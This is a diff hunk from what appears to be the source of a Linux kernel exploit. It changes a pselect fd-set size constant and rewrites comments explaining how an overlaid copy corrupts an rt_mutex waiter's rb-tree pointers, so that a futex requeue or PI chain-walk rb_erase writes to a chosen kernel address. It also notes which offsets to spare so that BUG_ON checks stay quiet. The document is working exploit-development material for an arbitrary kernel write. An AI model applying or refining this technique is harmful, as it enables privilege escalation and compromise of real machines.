@@ -79,19 +79,14 @@ extern int g_core_consumer;
  * task (+0x30) and lock (+0x38) are NOT copied and keep their real
  * kernel-written values.
  *
- * WRITE PRIMITIVE (2026-08-17): tree_entry.__rb_parent_color is set to
- * (target-8)|1 so that the requeue rb_erase in rt_mutex_adjust_prio_chain
- * reads parent = target-8, compares parent->rb_left with node (mismatch),
- * then writes node->rb_right (=0) to &parent->rb_right = target.
- *
- * Why not 128 (2 words/set)? The pi_waiters tree erase path is unreachable
- * for the requeued waiter (it's not in any owner's pi_waiters tree), so
- * corrupting pi_tree_entry serves no purpose and only adds risk.
- *
- * Why not 320 (5 words/set)? waiter->lock (+0x38) would be zeroed by the
- * FD_ZERO'd copy.  BUG_ON(root->lock != lock) in remove_waiter /
- * mark_wakeup_next_waiter would fire immediately. */
-#define PSELECT_ROUTE_NFDS 64
+ * 128 -> 2 words per set -> copies bits[0..5] onto waiter
+ * (waiter+0x00..+0x2f = tree_entry + pi_tree_entry).
+ * Phase 3: waiter priority boost (nice=-20) causes requeue to add waiter
+ * to owner's pi_waiters via pi_tree_entry.  pselect overlay sets
+ * pi_tree_entry.__rb_parent_color = (target-8)|1 so that consumer's
+ * FUTEX_LOCK_PI chain walk rb_erase writes to the target.
+ * task(+0x30) and lock(+0x38) are still beyond the copy window. */
+#define PSELECT_ROUTE_NFDS 128
 #define PSELECT_CONSUMER_NICE 19
 #define PSELECT_CONSUMER_BURST_CALLS 1
 #define PSELECT_CONSUMER_SETTLE_USEC 250000
